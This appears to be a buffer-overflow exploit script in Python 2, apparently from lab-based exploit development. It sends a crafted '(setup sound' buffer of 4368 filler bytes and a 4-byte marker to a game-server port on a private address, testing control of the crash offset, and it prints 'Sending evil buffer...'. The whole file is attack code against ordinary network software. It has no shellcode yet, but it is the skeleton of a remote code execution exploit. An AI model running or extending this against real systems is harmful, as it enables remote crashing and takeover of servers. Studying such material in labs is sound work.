#!/usr/bin/python

import socket

host='192.168.56.110'


buffer='\x11(setup sound ' + 'A'*4368 + 'B'*4 + 'C'*(4379-4368-4) + '\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print  'Sending evil buffer...'
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print('Payload Sent')


